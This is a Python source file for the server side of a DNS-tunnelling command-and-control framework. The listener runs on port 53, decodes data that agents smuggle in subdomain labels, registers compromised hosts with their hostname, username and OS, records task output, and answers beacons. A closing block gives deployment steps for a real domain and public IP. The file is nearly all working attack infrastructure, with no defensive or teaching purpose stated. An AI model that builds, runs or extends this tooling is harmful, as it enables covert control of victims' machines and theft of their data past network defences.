# import dns.rdataclass
# import dns.rdatatype
# import dns.message
# import dns.rcode
# import dns.name
# import dns.query
import logging
import dns # type: ignore
import socket
import threading
import time
import os
import sys

# Add necessary paths to sys.path for imports
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'utils'))
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'database'))
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'core'))

from logger import setup_logger
from encoder import DataEncoder
from db_manager import DBManager

logger = setup_logger('dns_listener', 'logs/dns_listener.log', level=logging.DEBUG, console_output=False)

class DNSListener:
    def __init__(self, c2_domain, c2_ip, db_manager: DBManager):
        # The base domain for C2 communications (e.g., "c2.yourdomain.com")
        self.c2_domain = dns.name.from_text(c2_domain)
        # The public IP of your C2 server
        self.c2_ip = c2_ip
        self.db_manager = db_manager
        self.udp_sock = None
        self.running = False
        logger.info(f"DNSListener initialized for domain: {c2_domain} at IP: {c2_ip}")

        # In a real C2, you'd integrate with agent/task managers here
        # For now, we'll just log and maybe store in DB directly

    def _handle_request(self, data, addr):
        """Processes a single incoming DNS request."""
        try:
            # Parse the incoming DNS message
            request = dns.message.from_wire(data)
            query_name = request.question[0].name
            query_type = request.question[0].rdtype

            logger.debug(f"Received DNS query from {addr}: {query_name} ({dns.rdatatype.to_text(query_type)})")

            # Check if the query is for our C2 domain or a subdomain
            if not query_name.is_subdomain(self.c2_domain) and query_name != self.c2_domain:
                logger.debug(f"Query for {query_name} is not for C2 domain {self.c2_domain}. Ignoring or forwarding.")
                # In a production setup, you might forward non-C2 queries to a legitimate DNS server
                # For this project, we'll just ignore for now or return SERVFAIL
                self._send_error_response(request, addr, dns.rcode.SERVFAIL)
                return

            # Prepare the DNS response message
            response = dns.message.make_response(request)
            response.flags |= dns.flags.AA # Authoritative Answer
            response.set_rcode(dns.rcode.NOERROR)

            # Extract data from the query name (if it's a subdomain)
            # The agent will encode data as sub-labels: <encoded_data_chunk1>.<encoded_data_chunk2>.c2.yourdomain.com
            # We are interested in the labels *before* the C2 domain
            relative_name = query_name - self.c2_domain
            data_labels = [label.decode('utf-8') for label in relative_name.labels if label]

            if data_labels:
                # Reconstruct the full encoded data from labels
                # The agent might send multiple labels if data is chunked
                full_encoded_data = "".join(data_labels)
                try:
                    decoded_data = DataEncoder.decode(full_encoded_data)
                    logger.info(f"Decoded data from agent {addr}: '{decoded_data}'")

                    # Example: Simple parsing for 'register' or 'output'
                    # In a real C2, you'd have a more robust command/data parser
                    if decoded_data.startswith("REGISTER:"):
                        parts = decoded_data.split(':', 2) # REGISTER:<session_id>:<info>
                        if len(parts) == 3:
                            _, session_id, agent_info = parts
                            # agent_info format: hostname|username|os_info|ip_address (agent-side IP)
                            # Use the source IP from the DNS request as well, it might be different if NAT'd
                            hostname, username, os_info, _ = agent_info.split('|', 3)
                            self.db_manager.add_agent(session_id, hostname, username, os_info, addr[0])
                            logger.info(f"Agent Registered: Session ID: {session_id}, Host: {hostname}, IP: {addr[0]}")
                            # Respond with agent ID (or a simple ACK)
                            agent_db_entry = self.db_manager.get_agent_by_id(session_id) # Need to implement get_agent_by_session_id
                            if agent_db_entry:
                                response_data = f"ACK:{agent_db_entry['id']}" # Send back agent ID
                            else:
                                response_data = "ACK:FAILED"
                            rdata = dns.rdtypes.IN.TXT.TXT(text=[response_data.encode('utf-8')])
                            response.answer.append(dns.rdset.from_rdata(rdata, query_name))
                            logger.debug(f"Responding to registration with TXT: {response_data}")

                        else:
                            logger.warning(f"Malformed REGISTER command: {decoded_data}")
                            self._send_error_response(request, addr, dns.rcode.FORMERR)
                            return
                    elif decoded_data.startswith("OUTPUT:"):
                        parts = decoded_data.split(':', 2) # OUTPUT:<task_id>:<output_data>
                        if len(parts) == 3:
                            _, task_id, output_data = parts
                            self.db_manager.update_task_status(int(task_id), 'completed', output_data)
                            logger.info(f"Task {task_id} completed. Output stored.")
                            # Respond with ACK
                            rdata = dns.rdtypes.IN.TXT.TXT(text=["ACK".encode('utf-8')])
                            response.answer.append(dns.rdset.from_rdata(rdata, query_name))
                            logger.debug("Responding to output with TXT: ACK")
                        else:
                            logger.warning(f"Malformed OUTPUT command: {decoded_data}")
                            self._send_error_response(request, addr, dns.rcode.FORMERR)
                            return
                    else:
                        logger.info(f"Unhandled decoded data from agent: {decoded_data}")
                        # If agent just beacons without data, we need to send tasks if any
                        # This would be integrated with the task_manager later
                        # For now, just respond with A record for beacon
                        rdata = dns.rdtypes.IN.A.A(self.c2_ip)
                        response.answer.append(dns.rdset.from_rdata(rdata, query_name))


                except Exception as e:
                    logger.error(f"Error decoding or processing agent data from {addr}: {e}", exc_info=True)
                    self._send_error_response(request, addr, dns.rcode.SERVFAIL)
                    return
            else:
                logger.debug(f"Query for {query_name} has no data labels. Likely a pure beacon.")
                # If a pure beacon, just respond with an A record or TXT with pending tasks
                # For now, just an A record indicating C2 is alive
                rdata = dns.rdtypes.IN.A.A(self.c2_ip)
                response.answer.append(dns.rdset.from_rdata(rdata, query_name))
                logger.debug(f"Responding to pure beacon with A record: {self.c2_ip}")


            # Send the response back to the agent
            self.udp_sock.sendto(response.to_wire(), addr)

        except dns.exception.DNSException as e:
            logger.warning(f"Malformed DNS request from {addr}: {e}")
            # Consider sending FORMERR response if request is malformed
            # self._send_error_response(request, addr, dns.rcode.FORMERR)
        except Exception as e:
            logger.error(f"An unexpected error occurred in _handle_request for {addr}: {e}", exc_info=True)


    def _send_error_response(self, request, addr, rcode):
        """Sends an error response for a given DNS request."""
        response = dns.message.make_response(request)
        response.set_rcode(rcode)
        response.flags |= dns.flags.AA
        try:
            self.udp_sock.sendto(response.to_wire(), addr)
            logger.debug(f"Sent DNS error response (rcode={dns.rcode.to_text(rcode)}) to {addr}")
        except Exception as e:
            logger.error(f"Failed to send error response to {addr}: {e}", exc_info=True)


    def _listen_udp(self):
        """Listens for incoming UDP DNS requests."""
        self.udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.udp_sock.bind(('', 53)) # Listen on all interfaces, port 53 (standard DNS port)
        self.udp_sock.settimeout(1.0) # Non-blocking timeout for graceful shutdown
        logger.info("DNS Listener UDP socket bound to port 53.")

        while self.running:
            try:
                data, addr = self.udp_sock.recvfrom(4096) # Max DNS UDP message size
                threading.Thread(target=self._handle_request, args=(data, addr), daemon=True).start()
            except socket.timeout:
                continue # Just check self.running flag again
            except Exception as e:
                if self.running: # Only log if not explicitly shutting down
                    logger.error(f"Error receiving UDP data: {e}", exc_info=True)

    def start(self):
        """Starts the DNS listener threads."""
        if not self.running:
            self.running = True
            logger.info("Starting DNS listener...")
            self.udp_thread = threading.Thread(target=self._listen_udp, daemon=True)
            self.udp_thread.start()
            logger.info("DNS Listener started successfully.")

    def stop(self):
        """Stops the DNS listener."""
        if self.running:
            logger.info("Stopping DNS listener...")
            self.running = False
            if self.udp_sock:
                self.udp_sock.close()
            if self.udp_thread and self.udp_thread.is_alive():
                self.udp_thread.join(timeout=5) # Wait for thread to finish
                if self.udp_thread.is_alive():
                    logger.warning("DNS UDP listener thread did not terminate gracefully.")
            logger.info("DNS Listener stopped.")

# Example usage for testing this module directly
if __name__ == "__main__":
    # WARNING: Running this will try to bind to port 53, which requires root/admin privileges
    # and might conflict with an existing DNS server on your machine.
    # For testing, ensure no other DNS server is running or use a non-privileged port (e.g., 5353)
    # but actual C2 requires port 53.

    print("--- DNS Listener Test ---")
    print("WARNING: This requires root/admin privileges to bind to port 53.")
    print("Ensure no other DNS server is running on this machine (e.g., systemd-resolved, dnsmasq).")
    print("Press Ctrl+C to stop.\n")

    # Mock DBManager for testing
    class MockDBManager:
        def __init__(self):
            self.agents = {} # session_id: {id: ..., hostname: ...}
            self.agent_id_counter = 0
            self.tasks = {} # task_id: {status: ..., output: ...}

        def add_agent(self, session_id, hostname, username, os_info, ip_address):
            if session_id not in self.agents:
                self.agent_id_counter += 1
                self.agents[session_id] = {
                    'id': self.agent_id_counter,
                    'session_id': session_id,
                    'hostname': hostname,
                    'username': username,
                    'os_info': os_info,
                    'ip_address': ip_address,
                    'checkin_time': time.strftime("%Y-%m-%d %H:%M:%S"),
                    'status': 'active'
                }
                print(f"[MockDB] Agent registered: {session_id}, ID: {self.agent_id_counter}")
            else:
                self.agents[session_id]['checkin_time'] = time.strftime("%Y-%m-%d %H:%M:%S")
                print(f"[MockDB] Agent updated: {session_id}")
            return True

        def get_agent_by_id(self, agent_id):
            for agent in self.agents.values():
                if agent['id'] == agent_id:
                    return agent
            return None

        def get_agent_by_session_id(self, session_id):
             return self.agents.get(session_id)

        def update_task_status(self, task_id, status, output=None):
            if task_id in self.tasks:
                self.tasks[task_id]['status'] = status
                if output:
                    self.tasks[task_id]['output'] = output
                print(f"[MockDB] Task {task_id} status updated to {status}. Output: {output[:50]}...")
                return True
            print(f"[MockDB] Task {task_id} not found for update.")
            return False

    mock_db = MockDBManager()

    # !!! REPLACE WITH YOUR ACTUAL C2 DOMAIN AND PUBLIC IP ADDRESS !!!
    # For local testing, you can use a fake domain and localhost IP,
    # but real agents will need to resolve this.
    C2_DOMAIN = "c2.example.com" # You need to own and configure this domain!
    C2_SERVER_IP = "127.0.0.1"    # Replace with your C2 server's public IP address

    listener = DNSListener(C2_DOMAIN, C2_SERVER_IP, mock_db)

    try:
        listener.start()
        print(f"\nDNS Listener running. Waiting for queries on port 53 for domain: {C2_DOMAIN}")
        print(f"Make sure NS records for {C2_DOMAIN} point to {C2_SERVER_IP}")
        while True:
            time.sleep(1) # Keep main thread alive
    except PermissionError:
        print("\nERROR: Permission denied. You need root/administrator privileges to bind to port 53.")
        print("Try running with `sudo python dns_listener.py` on Linux/macOS or as Administrator on Windows.")
    except KeyboardInterrupt:
        print("\nCtrl+C detected. Shutting down DNS Listener.")
    finally:
        listener.stop()
        print("DNS Listener stopped.")